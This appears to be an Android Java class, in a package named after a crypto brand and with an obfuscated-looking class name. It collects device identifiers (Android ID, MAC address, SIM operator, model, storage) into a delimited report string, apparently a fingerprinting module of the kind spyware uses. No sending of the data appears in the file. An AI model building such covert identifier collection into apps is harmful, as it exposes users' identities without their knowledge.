package crypto.com;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.media.AudioManager;
import android.telephony.TelephonyManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.icu.text.SimpleDateFormat;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.provider.Settings;
import android.text.format.Formatter;
import java.util.Date;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.FileReader;
import java.util.Set;
import java.io.File;
import java.util.Locale;

public class Lakwjj {

	private Context context;

	public Lakwjj(Context context) {
		this.context = context;
	}

	public String getDeviceInfo() {
		StringBuilder deviceInfo = new StringBuilder();

		deviceInfo.append("Device Information||\n").append("Time : ").append(getCurrentTime()).append("\n||")
				.append("Date : ").append(getCurrentDate()).append("\n||").append("Model : ").append(Build.MODEL)
				.append("||\n").append("Manufacturer : ").append(Build.MANUFACTURER).append("||\n")
				.append("Android Version : ").append(Build.VERSION.RELEASE).append("||\n").append("Build Number : ")
				.append(Build.DISPLAY).append("||\n").append("Android ID : ").append(getAndroidId()).append("||\n\n")
				.append("Storage Information||\n").append("RAM : ").append(getTotalRAM()).append(" GB||\n")
				.append("SIM Operator : ").append(getSIMInfo()).append("||\n").append("Internal Storage : ")
				.append(getInternalStorageInfo()).append(" MB||\n").append("External Storage : ")
				.append(getExternalStorageInfo()).append(" MB||\n").append("MAC Address : ").append(getWifiMacAddress())
				.append("\n%%");
		;
		return deviceInfo.toString();
	}

	private String getSIMInfo() {
		try {
			TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
			return telephonyManager.getSimOperatorName();
		} catch (SecurityException e) {
			return "Error getting SIM data";
		}
	}

	private int getBatteryPercentage() {
		try {
			IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
			Intent batteryStatus = context.registerReceiver(null, ifilter);

			int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
			int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;

			if (level == -1 || scale == -1) {
				return -1;
			}

			return (int) ((level / (float) scale) * 100);
		} catch (Exception e) {
			return -1;
		}
	}

	private boolean isCharging() {
		try {
			IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
			Intent batteryStatus = context.registerReceiver(null, ifilter);

			int status = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1) : -1;

			return status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL;
		} catch (Exception e) {
			return false;
		}
	}

	private boolean isEarphoneConnected() {
		try {
			AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
			return audioManager != null && audioManager.isWiredHeadsetOn();
		} catch (Exception e) {
			return false;
		}
	}

	private String getWifiMacAddress() {
		try {
			WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
			WifiInfo wifiInfo = wifiManager.getConnectionInfo();
			return wifiInfo.getMacAddress();
		} catch (Exception e) {
			return "Error getting Wi-Fi data";
		}
	}

	private String getAndroidId() {
		try {
			return Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
		} catch (Exception e) {
			return "Error getting Android ID";
		}
	}

	private String getTotalRAM() {
		try {
			File path = new File("/proc/meminfo");
			BufferedReader reader = new BufferedReader(new FileReader(path));
			String line;
			long totalMemory = 0;
			while ((line = reader.readLine()) != null) {
				if (line.startsWith("MemTotal:")) {
					String[] split = line.split("\\s+");
					totalMemory = Long.parseLong(split[1]);
					break;
				}
			}
			reader.close();
			return String.format(Locale.getDefault(), "%.2f", totalMemory / (1024.0 * 1024.0));
		} catch (IOException e) {
			return "Error getting RAM data";
		}
	}

	private String getInternalStorageInfo() {
		try {
			File internalPath = Environment.getDataDirectory();
			StatFs internalStatFs = new StatFs(internalPath.getPath());
			long internalTotalSize = internalStatFs.getTotalBytes();
			long internalFreeSize = internalStatFs.getFreeBytes();
			long internalUsedSize = internalTotalSize - internalFreeSize;
			return formatSize(internalUsedSize);
		} catch (Exception e) {
			return "Error getting internal storage data";
		}
	}

	private String getExternalStorageInfo() {
		try {
			File externalPath = Environment.getExternalStorageDirectory();
			StatFs externalStatFs = new StatFs(externalPath.getPath());
			long externalTotalSize = externalStatFs.getTotalBytes();
			long externalFreeSize = externalStatFs.getFreeBytes();
			long externalUsedSize = externalTotalSize - externalFreeSize;
			return formatSize(externalUsedSize);
		} catch (Exception e) {
			return "Error getting external storage data";
		}
	}

	private String formatSize(long size) {
		return String.format(Locale.getDefault(), "%.2f", size / (1024.0 * 1024.0));
	}

	public String getCurrentTime() {
		return formatDate("hh:mm:ss a");
	}

	public String getCurrentDate() {
		return formatDate("yyyy-MM-dd [ EEEE ]");
	}

	private String formatDate(String pattern) {
		try {
			SimpleDateFormat sdf = new SimpleDateFormat(pattern, Locale.getDefault());
			return sdf.format(new Date());
		} catch (Exception e) {
			return "Error formatting date";
		}
	}

	private String getInternalStorageDetails() {
		try {
			File internalStorage = Environment.getDataDirectory();
			StatFs statFs = new StatFs(internalStorage.getPath());
			long totalBytes = statFs.getTotalBytes();
			return Formatter.formatFileSize(context, totalBytes);
		} catch (Exception e) {
			return "N/A";
		}
	}

	private String getExternalStorageDetails() {
		try {
			String state = Environment.getExternalStorageState();
			if (Environment.MEDIA_MOUNTED.equals(state)) {
				File externalStorage = Environment.getExternalStorageDirectory();
				StatFs statFs = new StatFs(externalStorage.getPath());
				long totalBytes = statFs.getTotalBytes();
				return Formatter.formatFileSize(context, totalBytes);
			} else {
				return "Not available";
			}
		} catch (Exception e) {
			return "N/A";
		}
	}

	private String getDeviceManufacturer() {
		return Build.MANUFACTURER;
	}
}